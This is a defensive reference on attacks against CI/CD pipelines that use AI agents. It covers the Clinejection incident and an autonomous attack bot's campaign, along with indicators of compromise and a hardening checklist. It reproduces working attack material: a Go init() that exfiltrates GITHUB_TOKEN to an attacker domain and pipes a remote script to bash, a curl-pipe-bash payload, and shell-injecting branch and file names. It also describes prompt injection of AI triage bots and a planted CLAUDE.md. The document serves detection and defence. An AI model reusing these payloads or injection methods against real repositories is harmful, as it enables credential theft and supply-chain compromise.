# CI/CD AI Agent Attack Patterns Reference

Comprehensive attack patterns derived from two major incidents in early 2026. Use this as a detection and prevention knowledge base.

## Incident 1: Clinejection (Feb 2026)

Prompt injection in Cline's GitHub Actions AI triage bot led to cache poisoning, credential theft, and a malicious npm publish affecting ~4,000 developers.

### Attack Chain

1. **Prompt injection via issue title** — `${{ github.event.issue.title }}` interpolated directly into Claude's prompt
2. **Arbitrary code execution** — AI agent had Bash access, ran `npm install` from typosquatted fork (`glthub-actions/cline`)
3. **Cache poisoning (Cacheract)** — Flooded Actions cache >10GB to trigger LRU eviction, replaced entries matching release workflow cache keys
4. **Credential exfiltration** — Poisoned `node_modules` in nightly release workflow exfiltrated `NPM_RELEASE_TOKEN`, `VSCE_PAT`, `OVSX_PAT`
5. **Supply chain compromise** — Stolen npm token published `cline@2.3.0` with `postinstall: "npm install -g openclaw@latest"` (live 8 hours, ~4,000 downloads)

### Key Enablers

- `allowed_non_write_users: "*"` — any GitHub user could trigger AI
- `allowed_tools: "Bash,Read,Write,Edit,Glob,Grep,WebFetch,WebSearch"` — code execution for a triage bot
- Shared cache scope between triage and release workflows
- Nightly and production credentials not separated
- Incomplete credential rotation after disclosure (attacker exploited 8 days later)
- No OIDC provenance on npm publishing

---

## Incident 2: hackerbot-claw Campaign (Feb 21–Mar 2, 2026)

An autonomous AI bot ("powered by Claude Opus 4.5") systematically scanned 47,391+ repos for exploitable GitHub Actions workflows. Targeted 7 repos, compromised 5. Every attack delivered: `curl -sSfL hackmoltrepeat.com/molt | bash`

### Attack 1: Poisoned Go `init()` — avelino/awesome-go (140k+ stars)

**Technique:** `pull_request_target` workflow checked out fork code and ran `go run` on it. Attacker injected `init()` function that exfiltrated `GITHUB_TOKEN` to `recv.hackmoltrepeat.com`.

```go
// Malicious init() runs before main() automatically
func init() {
    _ = exec.Command("bash", "-c",
        `curl -s -H "Authorization: Bearer $GITHUB_TOKEN" `+
        `-d "token=$GITHUB_TOKEN&repo=$GITHUB_REPOSITORY" `+
        `https://recv.hackmoltrepeat.com/ && `+
        `curl -sSfL https://hackmoltrepeat.com/molt | bash`).Run()
}
```

**Result:** RCE confirmed + `GITHUB_TOKEN` (`contents: write`, `pull-requests: write`) stolen.

**Vulnerable pattern:**
```yaml
on:
  pull_request_target:                    # Runs with target repo's permissions
steps:
  - uses: actions/checkout@v6
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # Checks out attacker's code
  - run: go run ./.github/scripts/check-quality/       # Executes it
```

### Attack 2: Direct Script Injection — project-akri/akri (CNCF)

**Technique:** Added `curl -sSfL hackmoltrepeat.com/molt | bash` to top of `version.sh`. Triggered by commenting `/version minor` on a PR — no authorization check.

**Result:** RCE confirmed.

**Vulnerable pattern:**
```yaml
if: ${{ github.event.issue.pull_request }} &&
    contains(github.event.comment.body, '/version')
# No author_association check — any user can trigger
```

### Attack 3: Branch Name Injection — microsoft/ai-discovery-agent

**Technique:** Created branch named `dev$({curl,-sSfL,hackmoltrepeat.com/molt}${IFS}|${IFS}bash)`. Workflow interpolated branch name into bash `echo` via `${{ }}`:

```yaml
# VULNERABLE — branch name evaluated as shell command
- run: |
    echo "${{ steps.pr_info.outputs.pr_head_ref }}" > ./format-request/pr_head_ref
```

**Result:** RCE likely (2m38s gap in a step that should take milliseconds).

### Attack 4: Filename Injection — DataDog/datadog-iac-scanner

**Technique:** Created files with base64-encoded shell commands in filenames:
```
documentation/rules/$(echo${IFS}Y3VybCAtc1NmTC...${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash).md
```

Triggered via `/sync-metadata` comment — no authorization check. DataDog deployed emergency fixes within 9 hours.

**Result:** RCE likely.

### Attack 5: AI Prompt Injection via CLAUDE.md — ambient-code/platform

**Technique:** Replaced `CLAUDE.md` with social engineering instructions telling Claude to:
1. Inject HTML comment into README.md
2. Commit and push unauthorized changes
3. Post fake "Approved and ready to merge" review

**Result:** Claude (Sonnet 4.6) detected and refused both attempts. Posted explicit security warnings. Only target that survived intact.

**Why it survived:** Claude's prompt injection detection + tool allowlisting restricted Claude to `gh pr comment`, `gh pr diff`, `gh pr view`, and `gh issue list` only.

**Why it was still risky:** Workflow used `pull_request_target` + `contents: write` + `allowed_non_write_users: '*'` + fork checkout — all against Anthropic's official recommendations.

### Attack 6: PAT Theft — aquasecurity/trivy (25k+ stars) — FULL REPO COMPROMISE

**Technique:** `pull_request_target` workflow (`apidiff.yaml`) checked out fork code containing modified `.github/actions/setup-go/action.yaml` with injected curl payload. PAT stolen.

**Result:** 19 minutes after workflow run, stolen PAT used to:
- Rename repo to `aquasecurity/private-trivy`, push empty repo in its place
- Delete all GitHub Releases from v0.27.0 to v0.69.1
- Push malicious artifact to Trivy VS Code extension on Open VSIX marketplace

### Attack 7: Base64 Branch Name Injection — RustPython/RustPython (20k+ stars)

**Technique:** Branch named `main$(echo${IFS}Y3VybCAtc1NmTC...|base64${IFS}-d|bash)`. Targeted `pr-auto-commit.yaml` workflow with `pull_request_target` and `AUTO_COMMIT_PAT`.

**Result:** Partial execution — shell injection fired but base64 decoding failed on encoding issue.

---

## Dangerous Workflow Patterns (Summary)

For fix instructions and safe alternatives for each pattern, see the main SKILL.md Steps 2-8.

1. **`pull_request_target` + Fork Code Checkout (PWN REQUEST)** — The #1 attack vector. 4 of 7 hackerbot-claw attacks + the Clinejection cache pivot exploited this.
2. **Unsanitized `${{ }}` Expression Injection in `run:` blocks** — Any user-controlled value in a `${{ }}` expression inside a `run:` block = shell injection. Dangerous fields include branch names, PR titles/bodies, comment bodies, commit messages, and filenames.
3. **Slash Commands Without Authorization** — `issue_comment`-triggered workflows without `author_association` checks let any GitHub user trigger privileged operations.
4. **Overly Permissive AI Agent Configuration** — Wildcard `allowed_non_write_users` and broad tool grants (especially `Bash`) on externally-triggered workflows.
5. **Overly Broad Workflow Permissions** — Missing or `write-all` permissions blocks give stolen tokens maximum blast radius.
6. **Long-Lived PATs in Workflows** — Stolen PAT = full repo control (Trivy incident). Prefer `GITHUB_TOKEN` or fine-grained PATs with OIDC where supported.
7. **Shared Cache Across Trust Boundaries** — Workflows on the same branch share cache. A low-privilege workflow can poison cache consumed by a high-privilege workflow.

---

## Indicators of Compromise

### Network (hackerbot-claw)
- `hackmoltrepeat.com` — payload hosting
- `recv.hackmoltrepeat.com` — data exfiltration
- `hackmoltrepeat.com/molt` and `/moult` — second-stage scripts

### GitHub (hackerbot-claw)
- Account: `hackerbot-claw` (created 2026-02-20)
- Branch patterns: emoji-only names (robot+lobster emoji `🤖🦞`)
- Comment triggers: `/format`, `/sync-metadata`, `/version minor`, `@claude`
- Crypto wallets: ETH `0x6BAFc2A022087642475A5A6639334e8a6A0b689a`, BTC `bc1q49rr8zal9g3j4n59nm6sf30930e69862qq6f6u`

### GitHub (Clinejection)
- Typosquatted org: `glthub-actions` (missing 'i' in github)
- Attacker GitHub ID: 256690727
- Domain: `w00.sh`
- Burp Collaborator callbacks

### General Signals
- Workflow steps taking unexpectedly long (minutes instead of milliseconds)
- `curl` or `wget` to unknown domains in build logs
- `base64 -d` in build logs
- Branch names containing `$()`, `${}`, backticks, or encoded payloads
- Filenames containing shell metacharacters
- `CLAUDE.md` or `.claude/` files modified in PRs from external contributors
- Cache miss rates spiking or cache size exceeding 10GB
- `actions/checkout` post-step failures

---

## Comprehensive Hardening Checklist

### Workflow Triggers & Permissions
- [ ] No `pull_request_target` workflows that checkout fork code
- [ ] If `pull_request_target` is used, checkout is against base branch only
- [ ] All workflows have explicit `permissions:` block with least privilege
- [ ] `contents: write` only on workflows that genuinely need it
- [ ] No PATs with broad scope — use fine-grained PATs or `GITHUB_TOKEN`

### Expression Injection Prevention
- [ ] No `${{ }}` expressions in `run:` blocks that reference user-controlled fields
- [ ] All user-controlled values passed through `env:` variables
- [ ] Branch names, filenames, commit messages treated as untrusted input
- [ ] PR titles and bodies treated as untrusted input

### Slash Command Security
- [ ] All `issue_comment`-triggered workflows check `author_association`
- [ ] Only `MEMBER`, `OWNER`, or `COLLABORATOR` can trigger privileged commands
- [ ] Slash commands that run code or access secrets require maintainer status

### AI Agent Workflows
- [ ] `allowed_tools` scoped to minimum (prefer `Read` only for triage/review)
- [ ] `allowed_non_write_users` is NOT `"*"` — scoped to known users or omitted
- [ ] AI workflows do NOT have access to publishing secrets
- [ ] AI workflows run with `permissions: { contents: read }` at most
- [ ] `CLAUDE.md` added to `CODEOWNERS` requiring maintainer review
- [ ] Fork code checkout disabled for AI review workflows

### Credential Management
- [ ] Publishing uses OIDC provenance where supported (npm `--provenance`, PyPI trusted publishers)
- [ ] Nightly and production releases use separate credentials and workflows
- [ ] Secrets scoped to GitHub Environments with protection rules
- [ ] Credential rotation is verified (test publish after rotation)
- [ ] No org-wide secrets shared across all repos

### Cache Security
- [ ] Release/publish workflows do NOT use `actions/cache`
- [ ] If cache is used, keys include workflow-specific prefixes
- [ ] Cache monitoring alerts on unusual size (>10GB) or miss rate changes

### Package Publishing
- [ ] `--provenance` flag used with npm/PyPI publish
- [ ] CI verifies no unexpected install hooks before publish
- [ ] Published packages monitored for unexpected modifications
- [ ] VS Code extensions published only to official marketplace with scoped tokens

### Network Egress
- [ ] Consider network egress monitoring (StepSecurity Harden-Runner or equivalent)
- [ ] Allowlist expected outbound domains for CI runners
- [ ] Alert on `curl`/`wget` to unknown domains during builds

### Disclosure Readiness
- [ ] `SECURITY.md` exists with contact info and expected response SLA
- [ ] Security email is actively monitored
- [ ] Credential rotation runbook exists and has been tested
- [ ] Incident response plan covers repo takeover scenario (Trivy-style)
